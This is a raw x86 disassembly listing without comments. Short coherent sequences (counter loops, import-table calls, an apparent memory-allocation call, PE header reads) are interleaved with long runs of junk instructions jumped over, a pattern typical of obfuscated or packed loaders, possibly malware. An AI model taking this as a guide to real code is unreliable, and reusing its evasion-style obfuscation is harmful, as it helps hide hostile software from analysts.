  40b089:	adc    ecx,DWORD PTR ds:0x4235bf
  40b08f:	mov    DWORD PTR [ebp-0x28],esi
  40b092:	mov    DWORD PTR [ebp-0x2c],esi
  40b095:	add    ecx,DWORD PTR ds:0x41abd6
  40b09b:	mov    DWORD PTR [ebp-0x14],esi
  40b09e:	and    DWORD PTR ds:0x41510d,ebx
  40b0a4:	jmp    0x40b189
  40b0a9:	scas   al,BYTE PTR es:[edi]
  40b0aa:	mov    ch,0x8b
  40b0ac:	imul   edi,DWORD PTR [ecx+0x69],0x6e
  40b0b0:	pop    ecx
  40b0b1:	(bad)  
  40b0b2:	pusha  
  40b0b3:	fisttp WORD PTR [ecx-0x1b]
  40b0b6:	mov    eax,ds:0x3fc992ff
  40b0bb:	jle    0x40b13b
  40b0bd:	mov    dh,0x7e
  40b0bf:	jle    0x40b13f
  40b0c1:	imul   ecx,DWORD PTR [edi-0x57],0xd77a25e9
  40b0c8:	cmp    eax,0xd83fcf0c
  40b0cd:	pop    esp
  40b0ce:	cs jo  0x40b0b2
  40b0d1:	xor    BYTE PTR [ecx+0x4a],ch
  40b0d4:	icebp  
  40b0d5:	adc    al,0x22
  40b0d7:	adc    BYTE PTR [edx],ah
  40b0d9:	adc    edi,DWORD PTR [edx]
  40b0db:	adc    ebx,DWORD PTR ds:0xc52fde22
  40b0e1:	jge    0x40b125
  40b0e3:	in     al,dx
  40b0e4:	push   ebx
  40b0e5:	mov    ds:0xa4f38339,eax
  40b0ea:	or     edx,0x88ecf225
  40b0f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0f2:	mov    esp,0xb995dc67
  40b0f7:	xchg   DWORD PTR [esi+0x3ddc53a9],ebp
  40b0fd:	jmp    0x40b09c
  40b0ff:	sbb    edx,DWORD PTR [edx]
  40b101:	xchg   esi,eax
  40b102:	jp     0x40b156
  40b104:	scas   eax,DWORD PTR es:[edi]
  40b105:	sub    eax,0x5214f5de
  40b10a:	int    0x4d
  40b10c:	or     BYTE PTR [ebp+0x4e],ah
  40b10f:	fisubr WORD PTR [eax-0x80]
  40b112:	jns    0x40b0f6
  40b114:	mov    dh,0x22
  40b116:	jle    0x40b0fc
  40b118:	push   ds
  40b119:	mov    esp,0xbbce4219
  40b11e:	jns    0x40b179
  40b120:	out    0x8e,al
  40b122:	inc    edi
  40b123:	inc    ebx
  40b124:	fdivrp st(1),st
  40b126:	repnz rcl BYTE PTR [ebx],cl
  40b129:	imul   ebx,DWORD PTR [esi+0x14],0x32
  40b12d:	adc    eax,0x94decab3
  40b132:	pop    ds
  40b133:	out    0x8a,al
  40b135:	cmp    ah,dl
  40b137:	xor    al,0xb3
  40b139:	add    ch,BYTE PTR [edx]
  40b13b:	push   es
  40b13c:	mov    ah,BYTE PTR [ebx+0x52]
  40b13f:	hlt    
  40b140:	inc    esp
  40b141:	sub    BYTE PTR [eax],dh
  40b143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b144:	cmp    DWORD PTR [edx-0x6e],esi
  40b147:	hlt    
  40b148:	fisttp DWORD PTR [eax]
  40b14a:	push   ds
  40b14b:	cdq    
  40b14c:	cli    
  40b14d:	pop    ds
  40b14e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b14f:	es lock mov edx,0x6b53fd82
  40b156:	shl    edi,cl
  40b158:	fld    DWORD PTR [ebx+0x39]
  40b15b:	mov    esp,0x330cc720
  40b160:	xchg   BYTE PTR [eax-0x73ad2b13],dl
  40b166:	add    eax,0xb4ee7bd
  40b16b:	int3   
  40b16c:	inc    eax
  40b16d:	sbb    BYTE PTR [edx-0x71],bh
  40b170:	push   es
  40b171:	idiv   BYTE PTR [edx-0x48]
  40b174:	jb     0x40b119
  40b176:	and    dl,ah
  40b178:	les    edi,FWORD PTR [edi]
  40b17a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b17b:	sbb    esp,DWORD PTR [edi+0x64]
  40b17e:	push   edx
  40b17f:	adc    cl,bh
  40b181:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b182:	(bad)  
  40b183:	jno    0x40b17f
  40b185:	push   cs
  40b186:	mov    esi,0x758926f9
  40b18b:	clc    
  40b18c:	movzx  ecx,BYTE PTR ds:0x41abce
  40b193:	and    DWORD PTR ds:0x415115,ecx
  40b199:	jmp    0x40b27e
  40b19e:	mov    ebp,0xc5aa0686
  40b1a3:	stos   BYTE PTR es:[edi],al
  40b1a4:	popa   
  40b1a5:	jns    0x40b1e6
  40b1a7:	in     eax,dx
  40b1a8:	(bad)  
  40b1a9:	mov    ah,0x43
  40b1ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1ac:	ds push eax
  40b1ae:	add    DWORD PTR [esi+edi*2],edi
  40b1b1:	jle    0x40b169
  40b1b3:	jle    0x40b233
  40b1b5:	jle    0x40b14c
  40b1b7:	sbb    al,0xe4
  40b1b9:	jmp    0x716c91e9
  40b1be:	mov    esp,DWORD PTR [eax+0x31]
  40b1c1:	jmp    0x541ec702
  40b1c6:	imul   ebx,eax,0x66
  40b1c9:	das    
  40b1ca:	dec    edi
  40b1cb:	fstp   DWORD PTR [edi-0x68026e0f]
  40b1d1:	lods   eax,DWORD PTR ds:[esi]
  40b1d2:	lods   eax,DWORD PTR ds:[esi]
  40b1d3:	call   edi
  40b1d5:	sahf   
  40b1d6:	pop    eax
  40b1d7:	test   BYTE PTR [esi+0x4b],0xcb
  40b1db:	fld    DWORD PTR [ecx+ebp*8]
  40b1de:	(bad)  
  40b1df:	push   eax
  40b1e0:	sahf   
  40b1e1:	ficomp DWORD PTR [esi]
  40b1e3:	push   0x742aff5d
  40b1e8:	inc    edi
  40b1e9:	mov    al,gs:0xeebd7d5c
  40b1ef:	and    al,0x27
  40b1f1:	xor    al,0x19
  40b1f3:	mov    ch,0x7b
  40b1f5:	std    
  40b1f6:	pop    eax
  40b1f7:	sub    cx,di
  40b1fa:	cli    
  40b1fb:	rcl    edx,1
  40b1fd:	or     DWORD PTR [edx-0x29379a0b],edi
  40b203:	pop    ecx
  40b204:	fsubr  DWORD PTR [ecx+0x49]
  40b207:	hlt    
  40b208:	(bad)  
  40b209:	fsubr  st(6),st
  40b20b:	dec    esp
  40b20c:	std    
  40b20d:	jmp    0x40b238
  40b20f:	xor    al,0xd8
  40b211:	retf   0xce73
  40b214:	adc    eax,DWORD PTR [ebp-0x24aeb03f]
  40b21a:	outs   dx,DWORD PTR ds:[esi]
  40b21b:	sar    ah,cl
  40b21d:	stc    
  40b21e:	mov    edx,0x6d5f8316
  40b223:	outs   dx,BYTE PTR ds:[esi]
  40b224:	dec    esp
  40b225:	or     ch,BYTE PTR [esi-0x5e]
  40b228:	ret    0x392f
  40b22b:	push   0x3abfe567
  40b230:	and    ah,BYTE PTR [edi-0x6]
  40b233:	jo     0x40b23d
  40b235:	and    eax,0xdbb9bf8f
  40b23a:	fistp  DWORD PTR gs:[eax]
  40b23d:	pusha  
  40b23e:	dec    edx
  40b23f:	cmp    eax,0xb301ce81
  40b244:	push   esp
  40b245:	ror    BYTE PTR [ecx-0x56],cl
  40b248:	test   DWORD PTR [edx-0x5f],0x39734a25
  40b24f:	in     eax,0xdb
  40b251:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b252:	add    cl,BYTE PTR [ebx+0x7c]
  40b255:	imul   esi,eax,0x1d
  40b258:	add    DWORD PTR [edx-0x10],ecx
  40b25b:	je     0x40b203
  40b25d:	cdq    
  40b25e:	scas   eax,DWORD PTR es:[edi]
  40b25f:	jns    0x40b29f
  40b261:	rcr    BYTE PTR [eax+0x59f25547],1
  40b267:	jae    0x40b264
  40b269:	(bad)  
  40b26a:	ds mov bl,0x8f
  40b26d:	or     BYTE PTR ds:0x3d845d22,0xd9
  40b274:	cmp    ch,BYTE PTR [eax]
  40b276:	xor    al,0x97
  40b278:	ds xchg ebx,eax
  40b27a:	push   eax
  40b27b:	push   edi
  40b27c:	adc    BYTE PTR [eax],ch
  40b27e:	mov    ecx,DWORD PTR [ebp-0x18]
  40b281:	sub    DWORD PTR ds:0x4150fd,0x41abda
  40b28b:	xor    ecx,eax
  40b28d:	xor    edi,edi
  40b28f:	or     DWORD PTR ds:0x41236c,edi
  40b295:	add    ecx,ebx
  40b297:	not    eax
  40b299:	mov    DWORD PTR [ebp-0x20],ecx
  40b29c:	mov    eax,DWORD PTR [ebp-0x20]
  40b29f:	je     0x40bb71
  40b2a5:	mov    eax,ds:0x415105
  40b2aa:	xor    DWORD PTR ds:0x412354,eax
  40b2b0:	mov    eax,DWORD PTR [ebp-0x4]
  40b2b3:	xor    eax,0x7510859
  40b2b8:	and    DWORD PTR ds:0x4235bf,0x412358
  40b2c2:	add    eax,ebx
  40b2c4:	mov    DWORD PTR ds:0x4235bf,0x20c7
  40b2ce:	cmp    edi,eax
  40b2d0:	jmp    0x40b3b5
  40b2d5:	push   edi
  40b2d6:	pop    es
  40b2d7:	popf   
  40b2d8:	aam    0x6d
  40b2da:	fs push edi
  40b2dc:	test   DWORD PTR [edx+0x3ee65a33],edx
  40b2e2:	dec    edx
  40b2e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2e4:	sbb    bl,BYTE PTR [ecx+0x3c]
  40b2e7:	jle    0x40b367
  40b2e9:	mov    dh,0x7e
  40b2eb:	jle    0x40b36b
  40b2ed:	lods   al,BYTE PTR ds:[esi]
  40b2ee:	mov    ah,0x98
  40b2f0:	mov    al,0x57
  40b2f2:	inc    esi
  40b2f3:	cmp    dl,BYTE PTR [edi]
  40b2f5:	and    eax,0x847c04f3
  40b2fa:	xor    al,0x46
  40b2fc:	jle    0x40b2c9
  40b2fe:	ds jns 0x40b2d3
  40b301:	lea    esp,[edx-0x6dac9488]
  40b307:	cmp    BYTE PTR [ebx-0x68],ch
  40b30a:	adc    dl,BYTE PTR ds:0x6b6de313
  40b310:	shl    DWORD PTR [ebx+0x70],1
  40b313:	jb     0x40b305
  40b315:	jno    0x40b342
  40b317:	test   BYTE PTR [ebx+0x56],ch
  40b31a:	push   esi
  40b31b:	hlt    
  40b31c:	stos   BYTE PTR es:[edi],al
  40b31d:	xlat   BYTE PTR ds:[ebx]
  40b31e:	stc    
  40b31f:	xchg   esi,eax
  40b320:	lock scas eax,DWORD PTR es:[edi]
  40b322:	push   cs
  40b323:	pop    ds
  40b324:	ds rcl bl,cl
  40b327:	jecxz  0x40b380
  40b329:	cld    
  40b32a:	push   ds
  40b32b:	rcr    DWORD PTR [eax+0x5441b255],1
  40b331:	popf   
  40b332:	pop    eax
  40b333:	dec    esi
  40b334:	jecxz  0x40b2ce
  40b336:	push   0xb4994224
  40b33b:	push   cs
  40b33c:	sahf   
  40b33d:	xchg   ebx,eax
  40b33e:	ds (bad) 
  40b340:	jmp    0x93ed291b
  40b345:	(bad)  
  40b346:	jp     0x40b2d8
  40b348:	mov    al,0xc6
  40b34a:	pop    DWORD PTR [edx+0x51]
  40b34d:	les    esi,FWORD PTR ds:0xd235d974
  40b353:	push   edi
  40b354:	pushf  
  40b355:	dec    esp
  40b356:	and    DWORD PTR [ebx-0x10f6fee3],ecx
  40b35c:	cmp    eax,DWORD PTR [edi+0x5b]
  40b35f:	retf   0xc10c
  40b362:	(bad)  
  40b363:	fistp  DWORD PTR [esi-0x10c2c02]
  40b369:	inc    ebp
  40b36a:	call   0xb644:0xc6ef124f
  40b371:	push   ebx
  40b372:	int3   
  40b373:	lock push esp
  40b375:	mov    ds:0x4f21ecd8,al
  40b37a:	loope  0x40b34b
  40b37c:	mov    cl,0xec
  40b37e:	inc    edx
  40b37f:	push   ebp
  40b380:	xlat   BYTE PTR ds:[ebx]
  40b381:	frstpm(287 only) 
  40b383:	mov    bl,0x2d
  40b385:	add    edx,DWORD PTR [edx-0x69]
  40b388:	ins    BYTE PTR es:[edi],dx
  40b389:	xchg   edx,eax
  40b38a:	add    eax,0x379e5397
  40b38f:	or     eax,DWORD PTR [ecx]
  40b391:	jnp    0x40b357
  40b393:	jp     0x40b3ad
  40b395:	or     DWORD PTR [esi],esi
  40b397:	add    DWORD PTR [edi+0x55],esp
  40b39a:	lods   eax,DWORD PTR gs:[esi]
  40b39c:	mov    edx,0x6cbc0696
  40b3a1:	jno    0x40b399
  40b3a3:	jnp    0x40b417
  40b3a5:	inc    ebp
  40b3a6:	cmp    ebx,DWORD PTR [esi+0x6e]
  40b3a9:	ins    BYTE PTR es:[edi],dx
  40b3aa:	leave  
  40b3ab:	gs inc edx
  40b3ad:	mov    edi,0xdaecf730
  40b3b2:	leave  
  40b3b3:	lds    esp,FWORD PTR [edi+0x58f850f]
  40b3b9:	add    BYTE PTR [eax],al
  40b3bb:	push   DWORD PTR [ebp+0x8]
  40b3be:	mov    DWORD PTR ds:0x41abe2,0x7935
  40b3c8:	call   0x40a5e1
  40b3cd:	and    DWORD PTR ds:0x41237c,0x0
  40b3d7:	jmp    0x40b3eb
  40b3dc:	xor    ecx,ecx
  40b3de:	add    ecx,DWORD PTR ds:0x41237c
  40b3e4:	inc    ecx
  40b3e5:	mov    DWORD PTR ds:0x41237c,ecx
  40b3eb:	cmp    DWORD PTR ds:0x41237c,0x18
  40b3f2:	jae    0x40b452
  40b3f8:	cmp    DWORD PTR ds:0x41237c,0x24
  40b3ff:	jne    0x40b40e
  40b405:	push   DWORD PTR [ebp-0x14]
  40b408:	call   DWORD PTR ds:0x40d02c
  40b40e:	jmp    0x40b3dc
  40b413:	mov    DWORD PTR ds:0x415101,0x17
  40b41d:	cmp    DWORD PTR ds:0x415101,0x0
  40b424:	je     0x40b452
  40b42a:	cmp    DWORD PTR ds:0x415101,0x1d
  40b431:	jne    0x40b440
  40b437:	push   DWORD PTR [ebp-0xc]
  40b43a:	call   DWORD PTR ds:0x40d3a4
  40b440:	mov    esi,DWORD PTR ds:0x415101
  40b446:	dec    esi
  40b447:	mov    DWORD PTR ds:0x415101,esi
  40b44d:	jmp    0x40b41d
  40b452:	mov    DWORD PTR [ebp-0x20],eax
  40b455:	and    DWORD PTR ds:0x4235d3,0x0
  40b45f:	mov    eax,ds:0x4235d3
  40b464:	inc    eax
  40b465:	mov    ds:0x4235d3,eax
  40b46a:	cmp    DWORD PTR ds:0x4235d3,0x6
  40b471:	jne    0x40b485
  40b477:	push   DWORD PTR [ebp-0x10]
  40b47a:	push   0x41ad5b
  40b47f:	call   DWORD PTR ds:0x40d20c
  40b485:	cmp    DWORD PTR ds:0x4235d3,0x5
  40b48c:	jne    0x40b4a0
  40b492:	xor    eax,eax
  40b494:	or     eax,DWORD PTR ds:0x4235d3
  40b49a:	inc    eax
  40b49b:	mov    ds:0x4235d3,eax
  40b4a0:	cmp    DWORD PTR ds:0x4235d3,0x15
  40b4a7:	jb     0x40b45f
  40b4ad:	mov    DWORD PTR ds:0x41abca,0x15
  40b4b7:	cmp    DWORD PTR ds:0x41abca,0x0
  40b4be:	je     0x40b50b
  40b4c4:	cmp    DWORD PTR ds:0x41abca,0x22
  40b4cb:	jne    0x40b4f1
  40b4d1:	push   DWORD PTR [ebp-0x14]
  40b4d4:	push   DWORD PTR [ebp-0xc]
  40b4d7:	push   DWORD PTR [ebp-0x18]
  40b4da:	push   DWORD PTR [ebp-0x14]
  40b4dd:	push   DWORD PTR [ebp-0x1c]
  40b4e0:	push   DWORD PTR [ebp-0x1c]
  40b4e3:	push   0x15ca
  40b4e8:	push   DWORD PTR [ebp-0x28]
  40b4eb:	call   DWORD PTR ds:0x40d030
  40b4f1:	xor    ecx,ecx
  40b4f3:	or     ecx,DWORD PTR ds:0x41abca
  40b4f9:	dec    ecx
  40b4fa:	mov    DWORD PTR ds:0x41abca,ecx
  40b500:	jmp    0x40b4b7
  40b505:	sbb    DWORD PTR ds:0x41abd6,edi
  40b50b:	mov    eax,DWORD PTR [ebp-0x4]
  40b50e:	mov    ecx,DWORD PTR [ebp-0x20]
  40b511:	not    esi
  40b513:	mov    esi,0x7510859
  40b518:	xor    eax,esi
  40b51a:	sub    DWORD PTR ds:0x4235c7,0x7cc8
  40b524:	add    eax,ebx
  40b526:	cmp    ecx,eax
  40b528:	jmp    0x40b60d
  40b52d:	add    edi,ebx
  40b52f:	or     al,0xde
  40b531:	in     al,0xe9
  40b533:	loope  0x40b530
  40b535:	js     0x40b579
  40b537:	dec    ebp
  40b538:	inc    edi
  40b539:	or     bl,BYTE PTR [eax+0x3d914a3a]
  40b53f:	jle    0x40b5bf
  40b541:	mov    dh,0x7e
  40b543:	jle    0x40b5c3
  40b545:	dec    ebx
  40b546:	iret   
  40b547:	pop    esp
  40b548:	and    esp,DWORD PTR [edx+0x1fb3c268]
  40b54e:	jmp    0x15bd:0x429a4065
  40b555:	pop    ebp
  40b556:	sbb    ch,BYTE PTR [ebx-0x3a]
  40b559:	mov    al,ds:0xcef7f4eb
  40b55e:	shr    DWORD PTR [esi],1
  40b560:	sar    ecx,cl
  40b562:	pop    eax
  40b563:	push   eax
  40b564:	hlt    
  40b565:	push   ds
  40b566:	icebp  
  40b567:	call   0x2eed:0xad6e5a0e
  40b56e:	outs   dx,BYTE PTR ds:[esi]
  40b56f:	shl    DWORD PTR [edx+0xf],0xd9
  40b573:	addps  xmm1,xmm3
  40b576:	loopne 0x40b53e
  40b578:	xchg   DWORD PTR [ebx-0x19],ebx
  40b57b:	jecxz  0x40b569
  40b57d:	push   eax
  40b57e:	sti    
  40b57f:	push   ebx
  40b580:	loopne 0x40b50b
  40b582:	jns    0x40b598
  40b584:	pop    edi
  40b585:	out    dx,eax
  40b586:	test   eax,0xbf89feff
  40b58b:	fbstp  TBYTE PTR [ebp+0x2b8e29ba]
  40b591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b592:	jno    0x40b5d3
  40b594:	fmul   DWORD PTR [edi+ebx*8+0x1a4126d2]
  40b59b:	and    DWORD PTR [esi+0x7a],edi
  40b59e:	out    dx,al
  40b59f:	pop    es
  40b5a0:	adc    al,0x7f
  40b5a2:	sbb    DWORD PTR [ebx+0x76a6d002],0x105588a8
  40b5ac:	aad    0x83
  40b5ae:	cmp    eax,0x529408c1
  40b5b3:	inc    eax
  40b5b4:	mov    ebx,0x48dfee40
  40b5b9:	mov    ch,0x58
  40b5bb:	sbb    ebp,DWORD PTR [ebx+eax*1]
  40b5be:	pusha  
  40b5bf:	cmp    ecx,edi
  40b5c1:	sahf   
  40b5c2:	and    al,BYTE PTR [edx+0x1f]
  40b5c5:	dec    edx
  40b5c6:	mov    ds:0x72f9fa9c,al
  40b5cb:	shld   ebp,edx,0x14
  40b5cf:	sub    ah,BYTE PTR [edi-0x76f1fa4b]
  40b5d5:	push   edx
  40b5d6:	inc    ecx
  40b5d7:	xchg   esp,eax
  40b5d8:	or     bl,BYTE PTR ds:0x3b8cbab2
  40b5de:	test   BYTE PTR [eax+edi*1-0x5],0xa3
  40b5e3:	xlat   BYTE PTR ds:[ebx]
  40b5e4:	jno    0x40b642
  40b5e6:	les    ecx,FWORD PTR [eax+0x1]
  40b5e9:	es pop edi
  40b5eb:	sbb    BYTE PTR [ebx-0x1b],cl
  40b5ee:	inc    esp
  40b5ef:	jle    0x40b5d1
  40b5f1:	outs   dx,BYTE PTR ds:[esi]
  40b5f2:	or     dh,ch
  40b5f4:	icebp  
  40b5f5:	(bad)  
  40b5f6:	jae    0x40b618
  40b5f8:	mov    ebp,0x19b5539
  40b5fd:	push   eax
  40b5fe:	adc    dl,BYTE PTR [edi+0x17]
  40b601:	push   esi
  40b602:	jp     0x40b5a1
  40b604:	stos   BYTE PTR es:[edi],al
  40b605:	jo     0x40b589
  40b607:	sub    bh,BYTE PTR [edx+0x2c]
  40b60a:	sahf   
  40b60b:	dec    eax
  40b60c:	ror    DWORD PTR [edi],cl
  40b60e:	test   BYTE PTR [edx+0x5],al
  40b611:	add    BYTE PTR [eax],al
  40b613:	sbb    DWORD PTR ds:0x415115,0x412368
  40b61d:	push   DWORD PTR [ebp-0x20]
  40b620:	jmp    0x40b705
  40b625:	sti    
  40b626:	loopne 0x40b67d
  40b628:	lock push ebp
  40b62a:	cdq    
  40b62b:	sti    
  40b62c:	jns    0x40b666
  40b62e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b62f:	pop    ecx
  40b630:	out    0xe3,al
  40b632:	cmp    ah,bl
  40b634:	inc    eax
  40b635:	jmp    0xb6bf346c
  40b63a:	jle    0x40b6ba
  40b63c:	jle    0x40b5ed
  40b63e:	and    edx,edi
  40b640:	stos   BYTE PTR es:[edi],al
  40b641:	push   esi
  40b642:	mov    edx,0x6be6e8df
  40b647:	mov    esi,DWORD PTR [ebx+eax*2-0x1de91ef7]
  40b64e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b64f:	cwde   
  40b650:	fimul  WORD PTR [esi]
  40b652:	or     eax,0x8478d334
  40b657:	(bad)  
  40b658:	mov    ebx,esp
  40b65a:	div    DWORD PTR [ebp-0x3f761130]
  40b660:	mov    edx,0xe8c98963
  40b665:	xor    DWORD PTR [edx+esi*8+0x71],edx
  40b669:	mov    dh,0x47
  40b66b:	sti    
  40b66c:	daa    
  40b66d:	mov    edi,0x21a385a8
  40b672:	popa   
  40b673:	ret    
  40b674:	cmp    eax,DWORD PTR [ecx+eiz*1-0x7252753b]
  40b67b:	mov    edi,0x757873f1
  40b680:	int3   
  40b681:	sbb    BYTE PTR [esi-0x3c],ah
  40b684:	sub    esi,DWORD PTR [ebp+0x5f]
  40b687:	cmc    
  40b688:	stos   DWORD PTR es:[edi],eax
  40b689:	push   es
  40b68a:	add    DWORD PTR [edi+0x630dd1ad],edx
  40b690:	fwait
  40b691:	aad    0xf2
  40b693:	dec    edx
  40b694:	jo     0x40b6ea
  40b696:	add    esi,DWORD PTR [edi+ebx*8]
  40b699:	jg     0x40b69c
  40b69b:	xchg   edi,eax
  40b69c:	mov    ebp,DWORD PTR [ebp+0x11571c3b]
  40b6a2:	in     al,0xa0
  40b6a4:	push   0xc74c66a8
  40b6a9:	lea    ebp,[ecx+ecx*2+0x2453ba5c]
  40b6b0:	out    dx,al
  40b6b1:	ret    0x7dd8
  40b6b4:	jb     0x40b731
  40b6b6:	dec    esp
  40b6b7:	push   0xffffffa0
  40b6b9:	retf   
  40b6ba:	fwait
  40b6bb:	jg     0x40b6e7
  40b6bd:	sub    eax,DWORD PTR [edi+ecx*2]
  40b6c0:	pop    es
  40b6c1:	mov    cl,0xf9
  40b6c3:	aas    
  40b6c4:	fbstp  TBYTE PTR [edx-0x1dd3f134]
  40b6ca:	mov    ds:0x5799422f,eax
  40b6cf:	mov    cl,0x34
  40b6d1:	mov    esp,0xff5d22a1
  40b6d6:	sbb    eax,0x30cc7fb9
  40b6db:	lods   eax,DWORD PTR ds:[esi]
  40b6dc:	mov    WORD PTR [edi+0x3f],ds
  40b6df:	gs sahf 
  40b6e1:	sub    bh,cl
  40b6e3:	cmp    esi,DWORD PTR [edx]
  40b6e5:	pop    esp
  40b6e6:	jmp    0x686:0xaff4e8d0
  40b6ed:	dec    esp
  40b6ee:	mov    al,0x8c
  40b6f0:	(bad)  
  40b6f1:	or     al,0x45
  40b6f3:	cli    
  40b6f4:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6f6:	sbb    dh,BYTE PTR [edi-0x6]
  40b6f9:	cmp    dh,ch
  40b6fb:	das    
  40b6fc:	imul   ebx,DWORD PTR [esi],0x8
  40b6ff:	arpl   WORD PTR [ebx+0x78e10176],sp
  40b705:	push   DWORD PTR [ebp+0x8]
  40b708:	call   0x40a6ca
  40b70d:	or     DWORD PTR ds:0x41abde,edi
  40b713:	mov    DWORD PTR [ebp-0x14],eax
  40b716:	mov    eax,DWORD PTR [ebp-0x4]
  40b719:	adc    ecx,DWORD PTR ds:0x412370
  40b71f:	mov    ecx,DWORD PTR [ebp-0x14]
  40b722:	adc    DWORD PTR ds:0x4235cb,0x45e4
  40b72c:	xor    eax,esi
  40b72e:	add    eax,ebx
  40b730:	mov    DWORD PTR ds:0x415111,0x202e
  40b73a:	cmp    ecx,eax
  40b73c:	mov    DWORD PTR ds:0x412364,0x4412
  40b746:	je     0x40bb55
  40b74c:	and    DWORD PTR ds:0x417e49,0x0
  40b756:	mov    eax,ds:0x417e49
  40b75b:	inc    eax
  40b75c:	mov    ds:0x417e49,eax
  40b761:	cmp    DWORD PTR ds:0x417e49,0x22
  40b768:	jne    0x40b798
  40b76e:	push   0x415115
  40b773:	push   0x2bf6
  40b778:	push   DWORD PTR [ebp-0x14]
  40b77b:	push   0x415111
  40b780:	push   DWORD PTR [ebp-0x10]
  40b783:	push   0x41adfd
  40b788:	push   0x4def
  40b78d:	push   0x3000
  40b792:	call   DWORD PTR ds:0x40d210
  40b798:	cmp    DWORD PTR ds:0x417e49,0x12
  40b79f:	jb     0x40b756
  40b7a5:	mov    eax,DWORD PTR [ebp-0x14]
  40b7a8:	mov    eax,DWORD PTR [eax+0x18]
  40b7ab:	movzx  ecx,BYTE PTR ds:0x417e4d
  40b7b2:	sbb    DWORD PTR ds:0x41237c,ecx
  40b7b8:	mov    DWORD PTR [ebp-0x20],eax
  40b7bb:	xor    eax,eax
  40b7bd:	or     eax,DWORD PTR ds:0x412390
  40b7c3:	xor    ecx,ecx
  40b7c5:	xor    ecx,DWORD PTR ds:0x417eaa
  40b7cb:	sub    ecx,eax
  40b7cd:	sub    eax,DWORD PTR [eax+ecx*1]
  40b7d0:	mov    eax,DWORD PTR [ebp-0x14]
  40b7d3:	sub    DWORD PTR ds:0x4235c7,0x1830
  40b7dd:	mov    ecx,DWORD PTR [ebp+0x8]
  40b7e0:	add    DWORD PTR ds:0x41235c,0x415101
  40b7ea:	add    ecx,DWORD PTR [eax+0x20]
  40b7ed:	mov    DWORD PTR [ebp-0x28],ecx
  40b7f0:	mov    DWORD PTR ds:0x417e59,0x1f
  40b7fa:	cmp    DWORD PTR ds:0x417e59,0x0
  40b801:	je     0x40b84b
  40b807:	cmp    DWORD PTR ds:0x417e59,0xf
  40b80e:	jne    0x40b823
  40b814:	push   DWORD PTR [ebp-0x1c]
  40b817:	push   DWORD PTR [ebp-0x10]
  40b81a:	push   DWORD PTR [ebp-0x28]
  40b81d:	call   DWORD PTR ds:0x40d034
  40b823:	cmp    DWORD PTR ds:0x417e59,0x10
  40b82a:	jne    0x40b83b
  40b830:	mov    eax,ds:0x417e59
  40b835:	dec    eax
  40b836:	mov    ds:0x417e59,eax
  40b83b:	mov    eax,ds:0x417e59
  40b840:	dec    eax
  40b841:	mov    ds:0x417e59,eax
  40b846:	jmp    0x40b7fa
  40b84b:	mov    eax,DWORD PTR [ebp-0x14]
  40b84e:	mov    ecx,DWORD PTR [ebp+0x8]
  40b851:	add    ecx,DWORD PTR [eax+0x24]
  40b854:	jmp    0x40b939
  40b859:	mov    ch,0x76
  40b85b:	or     DWORD PTR [ecx+ecx*2+0x59],eax
  40b85f:	pop    ecx
  40b860:	pop    es
  40b861:	aas    
  40b862:	mov    edx,0x5dad23e6
  40b867:	imul   ecx,DWORD PTR [eax+0x21],0xb67e7e33
  40b86e:	jle    0x40b8ee
  40b870:	jle    0x40b87b
  40b872:	into   
  40b873:	mov    al,0x61
  40b875:	pop    ebp
  40b876:	pop    ebx
  40b877:	fsubr  QWORD PTR [edx]
  40b879:	addr16 sub ah,al
  40b87c:	jle    0x40b8ae
  40b87e:	out    dx,eax
  40b87f:	adc    al,0x76
  40b881:	cmp    eax,0x6c73b7ec
  40b886:	push   0x6f
  40b888:	add    ebp,DWORD PTR [ebx+0x602b0c2a]
  40b88e:	mov    cl,0x74
  40b890:	lds    ecx,FWORD PTR [eax]
  40b892:	inc    ecx
  40b893:	stos   BYTE PTR es:[edi],al
  40b894:	icebp  
  40b895:	inc    esi
  40b896:	push   ecx
  40b897:	dec    ebx
  40b898:	sub    bl,dh
  40b89a:	out    dx,al
  40b89b:	mov    ds:0xf80fee55,eax
  40b8a0:	and    BYTE PTR [esi],ch
  40b8a2:	jne    0x40b8c5
  40b8a4:	bound  edx,QWORD PTR [ecx+0x29c85694]
  40b8aa:	jns    0x40b903
  40b8ac:	mov    bh,0x96
  40b8ae:	dec    esp
  40b8af:	cmp    al,BYTE PTR ds:0x7292122
  40b8b5:	repz xlat BYTE PTR ds:[ebx]
  40b8b7:	mov    dh,0x1e
  40b8b9:	test   ah,al
  40b8bb:	mov    dh,0x91
  40b8bd:	pop    edi
  40b8be:	fsub   st(6),st
  40b8c0:	das    
  40b8c1:	fstp   QWORD PTR [ebx]
  40b8c3:	ja     0x40b8f9
  40b8c5:	(bad)  
  40b8c6:	pop    eax
  40b8c7:	lds    edi,FWORD PTR [edx-0x2a]
  40b8ca:	adc    bl,bl
  40b8cc:	fs (bad) 
  40b8cf:	std    
  40b8d0:	and    eax,0xc9fcccc6
  40b8d5:	lea    edi,[edi+0x51]
  40b8d8:	or     al,0xaf
  40b8da:	bound  edx,QWORD PTR [eax]
  40b8dc:	mov    DWORD PTR [ebx+esi*2+0x24],ebp
  40b8e0:	jae    0x40b91b
  40b8e2:	mov    esp,0x4ae721aa
  40b8e7:	sbb    dl,BYTE PTR [edx+0xa]
  40b8ea:	jle    0x40b889
  40b8ec:	std    
  40b8ed:	addr16 pop ds
  40b8ef:	cmp    BYTE PTR [ebp+eax*2-0x4c8ff724],bh
  40b8f6:	mov    esi,0xddffb581
  40b8fb:	fdiv   QWORD PTR [esi-0x75]
  40b8fe:	mov    ds:0x27ea2ab,al
  40b903:	or     al,0x3b
  40b905:	inc    edx
  40b906:	mov    eax,0x8f182a04
  40b90b:	js     0x40b8d0
  40b90d:	xchg   ebx,eax
